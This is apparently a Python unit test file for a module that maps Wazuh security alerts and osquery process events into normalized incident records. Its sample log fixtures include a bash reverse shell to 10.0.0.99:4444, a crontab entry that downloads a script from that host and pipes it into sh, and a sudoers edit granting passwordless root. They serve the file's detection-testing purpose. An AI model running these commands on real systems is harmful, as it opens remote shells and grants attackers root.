import unittest
import copy
from typing import Dict, Any

from event_mapper import map_events, map_wazuh_alert

# Sample Data
WAZUH_DATA = [
  {
    "timestamp": "2026-10-02T08:15:30.120+0000",
    "rule": {
      "level": 10,
      "description": "Possible privilege escalation via sudoers modification",
      "id": "5715",
      "mitre": { "id": ["T1548.003"] }
    },
    "agent": { "id": "001", "name": "prod-web-01", "ip": "192.168.10.15" },
    "data": { "command": "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" },
    "full_log": "Oct 02 08:15:30 prod-web-01 sudoers: user modified sudoers configuration"
  },
  {
    "timestamp": "2026-10-02T08:22:11.450+0000",
    "rule": {
      "level": 3,
      "description": "User login successful",
      "id": "5501"
    },
    "agent": { "id": "002", "name": "db-internal-01", "ip": "192.168.10.20" },
    "full_log": "Oct 02 08:22:11 db-internal-01 sshd[1244]: Accepted publickey for ubuntu"
  },
  {
    "timestamp": "2026-10-02T08:30:05.780+0000",
    "rule": {
      "level": 12,
      "description": "Reverse shell execution detected",
      "id": "100201",
      "mitre": { "id": ["T1059.004"] }
    },
    "agent": { "id": "001", "name": "prod-web-01", "ip": "192.168.10.15" },
    "data": {
      "win": {
        "eventdata": {
          "commandLine": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
        }
      }
    },
    "full_log": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
  }
]

OSQUERY_DATA = [
  {
    "name": "pack_incident_response_process_events",
    "hostIdentifier": "prod-web-01",
    "unixTime": 1790928935,
    "action": "added",
    "columns": {
      "pid": "4312",
      "name": "bash",
      "path": "/bin/bash",
      "cmdline": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
      "uid": "1001"
    }
  },
  {
    "name": "pack_compliance_crontab",
    "hostIdentifier": "prod-web-01",
    "unixTime": 1790928990,
    "action": "added",
    "columns": {
      "command": "curl http://10.0.0.99/mal.sh | sh",
      "path": "/etc/crontab",
      "uid": "0"
    }
  },
  {
    "name": "pack_system_state_socket_events",
    "hostIdentifier": "prod-web-01",
    "unixTime": 1790928920,
    "action": "removed",
    "columns": { "pid": "2041", "remote_address": "192.168.10.1" }
  }
]

class TestEventMapper(unittest.TestCase):
    def test_sample_events(self):
        with self.assertLogs("event_mapper", level='INFO') as cm:
            res = map_events(copy.deepcopy(WAZUH_DATA), copy.deepcopy(OSQUERY_DATA))

        self.assertEqual(res["noise_dropped"], 1)
        self.assertEqual(res["invalid"], [])
        self.assertEqual(len(res["attached"]), 1)

        expected_events = [
            {
                "alert": {
                    "id": "wazuh-001-5715-1790928930120",
                    "level": 10,
                    "name": "Possible privilege escalation via sudoers modification",
                    "timestamp": 1790928930120,
                    "mitre": ["T1548.003"]
                },
                "host": {"hostname": "prod-web-01", "ip": "192.168.10.15"}
            },
            {
                "alert": {
                    "id": "wazuh-001-100201-1790929805780",
                    "level": 12,
                    "name": "Reverse shell execution detected",
                    "timestamp": 1790929805780,
                    "mitre": ["T1059.004"]
                },
                "host": {"hostname": "prod-web-01", "ip": "192.168.10.15"},
                "process": {"pid": 4312, "name": "bash", "args": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"}
            }
        ]

        self.assertEqual(res["events"], expected_events)
        self.assertTrue(any("Attached process to alert" in msg for msg in cm.output))

    def test_real_wazuh_id(self):
        raw = copy.deepcopy(WAZUH_DATA[0])
        raw["id"] = "1790928930.123"
        status, ev, att = map_wazuh_alert(raw, [])
        self.assertEqual(status, "mapped")
        self.assertEqual(ev["alert"]["id"], "wazuh-1790928930.123")

    def test_two_different_pids(self):
        osq1 = copy.deepcopy(OSQUERY_DATA[0])
        osq2 = copy.deepcopy(OSQUERY_DATA[0])
        osq2["columns"]["pid"] = "9999"

        raw = copy.deepcopy(WAZUH_DATA[2]) # The reverse shell
        status, ev, att = map_wazuh_alert(raw, [osq1, osq2])

        self.assertEqual(status, "mapped")
        self.assertNotIn("process", ev)
        self.assertIsNone(att)

    def test_zero_candidates(self):
        raw = copy.deepcopy(WAZUH_DATA[2])
        status, ev, att = map_wazuh_alert(raw, [])
        self.assertEqual(status, "mapped")
        self.assertNotIn("process", ev)

    def test_different_host(self):
        osq1 = copy.deepcopy(OSQUERY_DATA[0])
        osq1["hostIdentifier"] = "another-host"
        raw = copy.deepcopy(WAZUH_DATA[2])
        status, ev, att = map_wazuh_alert(raw, [osq1])
        self.assertEqual(status, "mapped")
        self.assertNotIn("process", ev)

    def test_different_command(self):
        osq1 = copy.deepcopy(OSQUERY_DATA[0])
        osq1["columns"]["cmdline"] = "different command"
        raw = copy.deepcopy(WAZUH_DATA[2])
        status, ev, att = map_wazuh_alert(raw, [osq1])
        self.assertEqual(status, "mapped")
        self.assertNotIn("process", ev)

    def test_time_gap(self):
        raw = copy.deepcopy(WAZUH_DATA[2]) # TS: 1790929805780 (ms)
        # Note: 1790929805.780 seconds

        # 900s earlier:
        osq_gap_900 = copy.deepcopy(OSQUERY_DATA[0])
        osq_gap_900["unixTime"] = 1790929805.780 - 900

        status, ev, att = map_wazuh_alert(raw, [osq_gap_900])
        self.assertIn("process", ev)

        # 901s earlier:
        osq_gap_901 = copy.deepcopy(OSQUERY_DATA[0])
        osq_gap_901["unixTime"] = 1790929805.780 - 901
        status, ev, att = map_wazuh_alert(raw, [osq_gap_901])
        self.assertNotIn("process", ev)

    def test_osq_without_pid(self):
        osq1 = copy.deepcopy(OSQUERY_DATA[0])
        del osq1["columns"]["pid"]
        raw = copy.deepcopy(WAZUH_DATA[2])
        status, ev, att = map_wazuh_alert(raw, [osq1])
        self.assertNotIn("process", ev)

    def test_string_pid_becomes_int(self):
        osq1 = copy.deepcopy(OSQUERY_DATA[0])
        osq1["columns"]["pid"] = "4312"
        raw = copy.deepcopy(WAZUH_DATA[2])
        status, ev, att = map_wazuh_alert(raw, [osq1])
        self.assertEqual(ev["process"]["pid"], 4312)

    def test_missing_timestamp(self):
        raw = copy.deepcopy(WAZUH_DATA[0])
        del raw["timestamp"]
        status, ev, att = map_wazuh_alert(raw, [])
        self.assertEqual(status, "invalid")
        self.assertEqual(att, "Missing or invalid timestamp")

    def test_missing_agent_id_no_real_id(self):
        raw = copy.deepcopy(WAZUH_DATA[0])
        del raw["agent"]["id"]
        status, ev, att = map_wazuh_alert(raw, [])
        self.assertEqual(status, "invalid")
        self.assertEqual(att, "Missing agent.id or rule.id with no top-level id")

    def test_json_serializable(self):
        import json
        res = map_events(WAZUH_DATA, OSQUERY_DATA)
        try:
            json.dumps(res)
        except Exception as e:
            self.fail(f"Result not json serializable: {e}")

if __name__ == '__main__':
    unittest.main()